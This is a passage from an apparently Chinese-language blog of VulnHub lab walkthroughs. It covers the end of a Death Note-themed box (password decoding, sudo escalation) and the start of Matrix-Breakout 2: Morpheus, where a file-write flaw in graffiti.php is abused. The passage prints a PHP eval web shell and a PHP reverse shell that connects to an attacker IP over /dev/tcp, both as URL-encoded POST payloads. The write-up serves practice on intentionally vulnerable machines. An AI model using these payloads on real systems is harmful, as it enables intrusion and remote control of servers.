<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;fake-notebook-rule&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>找找位置</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223338919.png"><img src="/vulnhub/image-20221108223338919.png" alt="image-20221108223338919"></a></p>
<p>发现在</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/L/fake-notebook-rule</span><br></pre></td></tr></table></figure>

<p>查看其下文件信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223431583.png"><img src="/vulnhub/image-20221108223431583.png" alt="image-20221108223431583"></a></p>
<p>大概意思看来就是让我们用<code>cyberchef</code>对<code>case.wav</code>的字符串解密【一眼<code>16</code>进制，直接手动解码算了】</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">63</span> <span class="number">47</span> <span class="number">46</span> <span class="number">7</span>a <span class="number">63</span> <span class="number">33</span> <span class="number">64</span> <span class="number">6</span>b <span class="number">49</span> <span class="number">44</span> <span class="number">6</span>f <span class="number">67</span> <span class="number">61</span> <span class="number">32</span> <span class="number">6</span>c <span class="number">79</span> <span class="number">59</span> <span class="number">57</span> <span class="number">6</span>c <span class="number">7</span>a <span class="number">5</span>a <span class="number">58</span> <span class="number">5</span>a <span class="number">70</span> <span class="number">62</span> <span class="number">43</span> <span class="number">41</span> <span class="number">3</span>d</span><br></pre></td></tr></table></figure>

<p>我们解码试试</p>
<p>解<code>16</code>进制</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223720859.png"><img src="/vulnhub/image-20221108223720859.png" alt="image-20221108223720859"></a></p>
<p>解码<code>base64</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223847293.png"><img src="/vulnhub/image-20221108223847293.png" alt="image-20221108223847293"></a></p>
<blockquote>
<p>passwd : <code>kiraisevil</code> </p>
</blockquote>
<p>得到<code>kira</code>密码</p>
<p>我们直接登录</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">su kira</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223953100.png"><img src="/vulnhub/image-20221108223953100.png" alt="image-20221108223953100"></a></p>
<p> 登录成功</p>
<h2 id="4-提权-1"><a href="#4-提权-1" class="headerlink" title="4.提权"></a>4.提权</h2><p>我们先看看<code>kira</code>能以管理员身份执行哪些命令</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108224111044.png"><img src="/vulnhub/image-20221108224111044.png" alt="image-20221108224111044"></a></p>
<p>好家伙</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">ALL</span> : <span class="type">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>

<p>代表他可以以管理员身份执行一切命令，那他就相当于管理员了</p>
<p>执行</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo su</span> </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108224357240.png"><img src="/vulnhub/image-20221108224357240.png" alt="image-20221108224357240"></a></p>
<p>直接无密码进入管理员用户</p>
<p>然后查看到根目录查看<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108224501582.png"><img src="/vulnhub/image-20221108224501582.png" alt="image-20221108224501582"></a></p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: </span><br><span class="line">    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: </span><br><span class="line">   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         </span><br><span class="line">  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   </span><br><span class="line"> +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    </span><br><span class="line">#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     </span><br><span class="line">########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       </span><br><span class="line"></span><br><span class="line">##########follow me on twitter###########<span class="number">3</span></span><br><span class="line">and share this screen shot and tag @KDSAMF</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>游戏结束</strong></p>
<hr>
<h2 id="p-s-靶机彩蛋"><a href="#p-s-靶机彩蛋" class="headerlink" title="p.s.靶机彩蛋"></a>p.s.靶机彩蛋</h2><p>之前我们以<code>L</code>的身份查看<code>kira</code>，发现他底下有个<code>kira.txt</code>文本文件，我们无权访问</p>
<p>现在我们可以访问看看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108224728118.png"><img src="/vulnhub/image-20221108224728118.png" alt="image-20221108224728118"></a></p>
<p>发现是一串<code>base64</code>加码字符</p>
<p>解码看看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108224803164.png"><img src="/vulnhub/image-20221108224803164.png" alt="image-20221108224803164"></a></p>
<blockquote>
<p><code>please protect one of the following</code> </p>
<ol>
<li><p><code>L (/opt)</code></p>
</li>
<li><p><code>Misa (/var)</code></p>
</li>
</ol>
<p>  只能选其一来保护</p>
</blockquote>
<p><code>/opt</code>底下的<code>L</code>，我们已经看过了</p>
<p>我们看看<code>/var</code>下的<code>Misa</code>有什么</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108225235107.png"><img src="/vulnhub/image-20221108225235107.png" alt="image-20221108225235107"></a></p>
<blockquote>
<p><code>it is toooo late for misa</code><br>#对米沙而言，已经太迟了</p>
</blockquote>
<p>感兴趣的朋友可以去看看<code>DEATH NOTE</code></p>
<hr>
<h1 id="二、MATRIX-BREAKOUT：2-MORPHEUS-中级"><a href="#二、MATRIX-BREAKOUT：2-MORPHEUS-中级" class="headerlink" title="二、MATRIX-BREAKOUT：2 MORPHEUS[中级]"></a>二、MATRIX-BREAKOUT：2 MORPHEUS[中级]</h1><p><strong>《矩阵突破》:2 墨菲斯</strong></p>
<blockquote>
<p>描述：<br><code>This is the second in the Matrix-Breakout series, subtitled Morpheus:1. It’s themed as a throwback to the first Matrix movie. You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out from, which holds the key to a mystery.</code><br><code>Difficulty: Medium-Hard</code></p>
<p>这是 Matrix-Breakout 系列中的第二部，副标题为 Morpheus:1。它的主题是回归第一部 Matrix 电影。您扮演 Trinity，试图调查 Nebuchadnezzar 上的一台计算机，Cypher 已将其他人拒之门外，而这台计算机掌握着解开谜团的钥匙。<br>难度：中等难度</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="https://i0.wp.com/xnfood.com.tw/wp-content/uploads/20211012094553_22.jpeg"><img src="https://i0.wp.com/xnfood.com.tw/wp-content/uploads/20211012094553_22.jpeg" alt="懶人包》『駭客任務』系列電影回顧，1 ~ 4 集詳細劇情、心得 ..."></a></p>
<blockquote>
<p>wc确实有东西<br>实在不懂可以看这个研讨会视频<br><code>https://www.beyondtrust.com/webinars/attacking-and-defending-linux-breaking-out-of-the-matrix-edition#video-container</code><br>虽然这个不是这个靶机的wp，但是我还是从其中获得很多思路</p>
</blockquote>
<h2 id="信息收集-10"><a href="#信息收集-10" class="headerlink" title="信息收集"></a>信息收集</h2><p>先扫描一下端口</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117130716527.png"><img src="/vulnhub/image-20221117130716527.png" alt="image-20221117130716527"></a></p>
<blockquote>
<p>发现<code>22</code>端口开放，运行着<code>ssh</code><br><code>80，81</code>两个端口都运行着<code>http</code><br>但是两者名字不同，可以判断出<br>但是80端口可以任意访问，<code>81</code>端口访问需要一定权限</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117134302741.png"><img src="/vulnhub/image-20221117134302741.png" alt="image-20221117134302741"></a></p>
<blockquote>
<p>发现81端口是需要登录的</p>
</blockquote>
<p>然后<code>dirsearch</code>扫一下目录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117130822881.png"><img src="/vulnhub/image-20221117130822881.png" alt="image-20221117130822881"></a></p>
<blockquote>
<p>发现网站目录下有爬虫协议，我们可以访问看看其中有没有关键信息</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117131146601.png"><img src="/vulnhub/image-20221117131146601.png" alt="image-20221117131146601"></a></p>
<blockquote>
<p><code>There&#39;s no white rabbit here.  Keep searching!</code><br>意思是：这里没有白兔。继续搜索！ </p>
<p>#<code>white rabbit</code>就是爱丽丝梦游仙境里的，跟着白色的兔子，掉进兔子洞</p>
<p>看来是有个引导的信息，会带我们找到一个很关键的东西</p>
</blockquote>
<p>再用<code>whatweb</code>查看网站可显示的框架</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117131950416.png"><img src="/vulnhub/image-20221117131950416.png" alt="image-20221117131950416"></a></p>
<p>没有啥信息</p>
<p>我们访问网站看看有没有其他信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117131405964.png"><img src="/vulnhub/image-20221117131405964.png" alt="image-20221117131405964"></a></p>
<blockquote>
<p><code>Welcome to the Boot2Root CTF, Morpheus:1.</code></p>
<p><code>You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.</code></p>
<p><code>Good luck! - @jaybeale from @inguardians</code><br>意思是：<br>欢迎来到Boot2Root CTF，墨菲斯:1.</p>
<p>你扮演<code>Trinity</code>，试图调查尼布甲尼撒半岛上的一台电脑，<code>Cypher</code>把所有人都锁在外面，至少对于<code>ssh</code>。</p>
<p>祝你好运！ -@jaybealefrom@inguardians </p>
<p>#Cypher电影中反抗组织的一个叛徒，他把反抗组织锁在门外，我们又要用到ssh<br>那看来ssh登录的用户名为Cypher</p>
</blockquote>
<p>信息还是太少了，<code>dirsearch</code>只扫到两个可以访问，实在利用太少</p>
<p>所以我们换个扫描工具</p>
<h3 id="dirbuster"><a href="#dirbuster" class="headerlink" title="dirbuster"></a>dirbuster</h3><blockquote>
<p>DirBuster支持全部的Web目录扫描方式，用来探测web服务器上的目录和隐藏文件</p>
</blockquote>
<p>这里我利用的是</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/dirbuster/</span>wordlists/</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221119232447671.png"><img src="/vulnhub/image-20221119232447671.png" alt="image-20221119232447671"></a></p>
<p>我通过<code>dirbuster</code>工具扫描到</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.80.131/graffiti.php</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221119232601421.png"><img src="/vulnhub/image-20221119232601421.png" alt="image-20221119232601421"></a></p>
<p>【看来dirsearch的目录太少了】</p>
<p>访问</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.80.131/graffiti.php</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221119234606473.png"><img src="/vulnhub/image-20221119234606473.png" alt="image-20221119234606473"></a></p>
<p>发现是个留言信息的一个网站</p>
<p>而且我们评论的信息被包含在了<code>graffiti.php</code>文件中</p>
<p>猜测是文件写入</p>
<p>于是抓包查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222151129426.png"><img src="/vulnhub/image-20230222151129426.png" alt="image-20230222151129426"></a></p>
<p>发现数据为</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">message</span>=hello&amp;<span class="keyword">file</span>=graffiti.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>message为写入信息</p>
<p>file为写入文件名称，而且还有后缀名字</p>
</blockquote>
<p>那么如果修改后面的文件名称，我们是不是可以实现文件上传的效果，上传一个包含木马的文件</p>
<h3 id="一句话🐎"><a href="#一句话🐎" class="headerlink" title="一句话🐎"></a>一句话🐎</h3><p>那就写一个一句话</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后再<code>url</code>编码</p>
<p>于是最后</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message=%3C%3Fphp%20%40eval(%24_POST%5B<span class="string">&#x27;cmd&#x27;</span>%5D)%3B%20%3F%3E&amp;<span class="keyword">file</span>=hello.php</span><br></pre></td></tr></table></figure>

<p>如果你是开了火绒，那你可能会看到，刚发送就被火绒检测到网站存在一句话🐎，代表确实是可以的</p>
<p>用<code>nc</code>监听反弹<code>shell</code>也是一样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.22.204.2/1234 0&gt;&amp;1&#x27;&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">message</span>=%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>exec(%<span class="number">22</span>%<span class="number">2</span>Fbin%<span class="number">2</span>Fbash%<span class="number">20</span>-c%<span class="number">20</span>&#x27;bash%<span class="number">20</span>-i%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">26</span>%<span class="number">20</span>%<span class="number">2</span>Fdev%<span class="number">2</span>Ftcp%<span class="number">2</span>F<span class="number">172.22.204.2</span>%<span class="number">2</span>F1234%<span class="number">200</span>%<span class="number">3</span>E%<span class="number">261</span>&#x27;%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">3</span>F%<span class="number">3</span>E&amp;file=hello.php</span><br></pre></td></tr></table></figure>



<p>访问<code>hello.php</code>文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222152248020.png"><img src="/vulnhub/image-20230222152248020.png" alt="image-20230222152248020"></a></p>
<p>拿到<code>shell</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222152313081.png"><img src="/vulnhub/image-20230222152313081.png" alt="image-20230222152313081"></a></p>
<h2 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h2><p>到根目录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222152956576.png"><img src="/vulnhub/image-20230222152956576.png" alt="image-20230222152956576"></a></p>
<blockquote>
<p>Flag 1!</p>
<p>You’ve gotten onto the system.  Now why has Cypher locked everyone out of it?</p>
<p>Can you find a way to get Cypher’s password? It seems like he gave it to<br>Agent Smith, so Smith could figure out where to meet him.</p>
<p>Also, pull this image from the webserver on port 80 to get a flag.</p>
<p>&#x2F;.cypher-neo.png</p>
<p>标志1 !</p>
<p>你已经进入系统了。为什么塞弗把所有人都锁在外面?</p>
<p>你能想办法拿到塞弗的密码吗?看来他把它给了<br>史密斯探员，这样史密斯就能找到和他见面的地方。</p>
<p>另外，从端口80的web服务器上拉出这个图像来获得一个标志。&#x2F;.cypher-neo.png</p>
</blockquote>
<p>提示我们需要从网站上找到图片<code>.cypher-neo.png</code>，拿到其中的密码</p>
<p>直接wget</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222153353400.png"><img src="/vulnhub/image-20230222153353400.png" alt="image-20230222153353400"></a></p>
<h2 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a>FLAG2</h2><p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222153942426.png"><img src="/vulnhub/image-20230222153942426.png" alt="image-20230222153942426"></a></p>

    </div>

    
    
    
      
  <div class="popular-posts-header">相关文章</div>
  <ul class="popular-posts">
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\wp-CTFHub\" rel="bookmark">CTFHub-wp</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\underline-learning\" rel="bookmark">线下靶场学习</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\wp-Gongfang\" rel="bookmark">攻防世界靶场wp</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\wp-buuctf\" rel="bookmark">buuctf靶场wp</a></div>
    </li>
  </ul>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/wp-CTFHub/" rel="prev" title="CTFHub-wp">
      <i class="fa fa-chevron-left"></i> CTFHub-wp
    </a></div>
      <div class="post-nav-item">
    <a href="/htb(STARTING-POINT)/" rel="next" title="htbのSTARTING POINT">
      htbのSTARTING POINT <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DC%E7%B3%BB%E5%88%97%E3%80%901-9%E3%80%91-%E5%AE%8C"><span class="nav-number">2.</span> <span class="nav-text">DC系列【1~9】(完)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81DC-1-%E5%88%9D%E7%BA%A7"><span class="nav-number">3.</span> <span class="nav-text">一、DC-1[初级]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag1"><span class="nav-number">3.2.</span> <span class="nav-text">Flag1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#msf"><span class="nav-number">3.2.1.</span> <span class="nav-text">msf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><span class="nav-number">3.2.2.</span> <span class="nav-text">*交互式shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag2"><span class="nav-number">3.3.</span> <span class="nav-text">Flag2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag3"><span class="nav-number">3.4.</span> <span class="nav-text">Flag3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%EF%BC%89mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%AE%E6%94%B9admin%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%EF%BC%88%E6%88%96%E8%80%85%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%EF%BC%89"><span class="nav-number">3.4.1.</span> <span class="nav-text">1）mysql数据库修改admin用户的密码（或者新建一个用户密码）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%EF%BC%89%E5%88%A9%E7%94%A8drupal%E8%84%9A%E6%9C%AC%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7"><span class="nav-number">3.4.2.</span> <span class="nav-text">2）利用drupal脚本添加管理员用户</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag4"><span class="nav-number">3.5.</span> <span class="nav-text">Flag4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%EF%BC%89%E4%B8%AA%E4%BA%BA%E6%96%B9%E6%B3%95"><span class="nav-number">3.5.1.</span> <span class="nav-text">1）个人方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%EF%BC%89%E5%AE%98%E6%96%B9%E6%96%B9%E6%B3%95"><span class="nav-number">3.5.2.</span> <span class="nav-text">2）官方方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag5"><span class="nav-number">3.6.</span> <span class="nav-text">Flag5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#suid%E6%8F%90%E6%9D%83"><span class="nav-number">3.6.1.</span> <span class="nav-text">suid提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81DC-2-%E5%88%9D%E7%BA%A7"><span class="nav-number">4.</span> <span class="nav-text">二、DC-2[初级]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">4.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag1-1"><span class="nav-number">4.2.</span> <span class="nav-text">Flag1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag2-1"><span class="nav-number">4.3.</span> <span class="nav-text">Flag2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cewl"><span class="nav-number">4.3.1.</span> <span class="nav-text">cewl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wpscan"><span class="nav-number">4.3.2.</span> <span class="nav-text">wpscan</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag3-1"><span class="nav-number">4.4.</span> <span class="nav-text">Flag3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rbash"><span class="nav-number">4.4.1.</span> <span class="nav-text">rbash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vi%E7%BB%95%E8%BF%87-rbash%E9%80%83%E9%80%B8"><span class="nav-number">4.4.2.</span> <span class="nav-text">*vi绕过-&gt;rbash逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-number">4.4.3.</span> <span class="nav-text">*设置全局变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag4-1"><span class="nav-number">4.5.</span> <span class="nav-text">Flag4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag5-1"><span class="nav-number">4.6.</span> <span class="nav-text">Flag5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#git%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.6.1.</span> <span class="nav-text">*git缓存区溢出漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E7%AA%97%E5%8F%A3%E5%A4%A7%E5%B0%8F"><span class="nav-number">4.6.1.1.</span> <span class="nav-text">*注意窗口大小</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E7%AA%97%E5%8F%A3%E8%B6%B3%E5%A4%9F%E5%A4%A7"><span class="nav-number">4.6.1.1.1.</span> <span class="nav-text">1.窗口足够大</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E7%AA%97%E5%8F%A3%E5%B0%8F%E4%B8%80%E4%BA%9B"><span class="nav-number">4.6.1.1.2.</span> <span class="nav-text">2.窗口小一些</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%95-1-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%8B%BF%E5%88%B0root%E7%9A%84shell"><span class="nav-number">4.6.2.</span> <span class="nav-text">法 1.执行命令，拿到root的shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%95-2-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%8C%E7%99%BB%E5%BD%95"><span class="nav-number">4.6.3.</span> <span class="nav-text">法 2.修改密码，登录</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81DC-3-%E5%88%9D%E7%BA%A7"><span class="nav-number">5.</span> <span class="nav-text">三、DC-3[初级]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="nav-number">5.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#john"><span class="nav-number">5.2.</span> <span class="nav-text">john</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%EF%BC%8C%E8%BF%9B%E5%85%A5shell"><span class="nav-number">5.3.</span> <span class="nav-text">后门生成，进入shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%951"><span class="nav-number">5.3.1.</span> <span class="nav-text">法1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="nav-number">5.3.1.1.</span> <span class="nav-text">msf生成木马</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#msf%E5%88%A9%E7%94%A8%E6%9C%A8%E9%A9%AC"><span class="nav-number">5.3.1.1.1.</span> <span class="nav-text">msf利用木马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">5.3.1.1.2.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%952"><span class="nav-number">5.3.2.</span> <span class="nav-text">法2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">5.3.2.1.</span> <span class="nav-text">反弹shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%953"><span class="nav-number">5.3.3.</span> <span class="nav-text">法3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#weevely%E3%80%90%E6%8F%90%E6%9D%83%E6%B2%A1%E5%9B%9E%E6%98%BE%E3%80%91"><span class="nav-number">5.3.3.1.</span> <span class="nav-text">weevely【提权没回显】</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81DC-4-%E5%88%9D%E7%BA%A7"><span class="nav-number">6.</span> <span class="nav-text">四、DC-4[初级]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3"><span class="nav-number">6.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 